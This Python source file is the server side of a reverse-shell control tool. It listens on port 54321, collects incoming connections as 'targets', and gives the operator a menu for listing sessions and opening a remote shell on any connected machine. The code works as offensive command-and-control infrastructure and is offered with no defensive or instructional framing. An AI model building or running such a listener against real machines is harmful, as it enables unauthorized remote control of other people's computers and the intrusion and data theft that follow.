#!/usr/bin/env python3
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, SOCK_DGRAM
from socket import socket
from threading import Thread

from server.shell import Shell
from lib.colors import color
from lib.output import usage
from lib.title import Title


class Server:

    def __init__(self):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.ips = []
        self.targets = []
        self.clients = 0
        self.stop_threads = False

    def sock_object(self):
        sock = socket(AF_INET, SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        try:
            self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.sock.bind((ip, 54321))
            self.sock.listen(5)
        except OSError as err:
            color.b_red.print(err)

    def thread(self):
        t1 = Thread(target=self.server)
        t1.start()

    def show_targets(self):
        count = 1
        for ip in self.ips:
            prompt = f"Session {str(count)}. <---> {str(ip)}"
            color.grn.print(prompt)
            count += 1
        print()

    def start_session(self, cmd):
        try:
            sessions = (int(cmd[8:]) - 1)
            color.grn.print("[+] Connection Established\n")
            cmd = Shell(self.ips, self.targets, sessions)
            cmd.shell()
        except (IndexError, ValueError, OSError):
            prompt = "[!] No Session Matches That Selection\n"
            color.b_red.print(prompt)

    def exit_control(self):
        for target in self.targets:
            target.close()
        self.sock.close()
        self.stop_threads = True

    def control_centre(self):
        while True:
            cmd = input(f"{Title().icon} ")
            if (cmd[:7] in ("targets", "command")
                    and (not self.targets or not self.ips)):
                color.b_red.print("[!] No Targets Found.")
                color.ylw.print("[*] Is a Reverse Shell Running?\n")
                continue
            if cmd == "targets":
                self.show_targets()
            elif cmd[:7] == "session":
                self.start_session(cmd)
                continue
            elif cmd == "exit":
                self.exit_control()
            else:
                color.ylw.print(usage(session=True))

    def server(self):
        while True:
            if self.stop_threads:
                break
            self.sock.settimeout(1)
            try:
                target, ip = self.sock.accept()
                self.targets.append(target)
                self.ips.append(ip)
                color.grn.print(f"\nConnected to {self.ips[self.clients]}!")
                self.clients += 1
            except OSError:
                pass
